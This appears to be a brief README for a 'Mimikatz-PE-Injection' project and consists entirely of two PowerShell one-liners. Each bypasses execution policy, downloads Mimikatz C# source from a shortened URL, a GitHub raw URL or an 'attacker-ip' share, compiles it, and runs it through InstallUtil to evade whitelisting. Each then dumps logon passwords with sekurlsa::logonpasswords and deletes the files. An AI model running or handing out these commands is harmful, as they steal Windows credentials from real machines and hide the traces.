# Mimikatz-PE-Injection

powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('https://is.gd/Dopn98','katz.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* && csc.exe /unsafe /reference:System.IO.Compression.dll /out:katz.exe katz.cs && InstallUtil.exe /logfile= /LogToConsole=false /U katz.exe && katz.exe log privilege::debug sekurlsa::logonpasswords exit && del katz.*

powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/Mimikatz-PE-Injection/master/katz.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* && csc.exe /unsafe /reference:System.IO.Compression.dll /out:katz.exe \\attacker-ip\share_name\katz.cs && InstallUtil.exe /logfile= /LogToConsole=false /U katz.exe && katz.exe log privilege::debug sekurlsa::logonpasswords exit && del katz.*

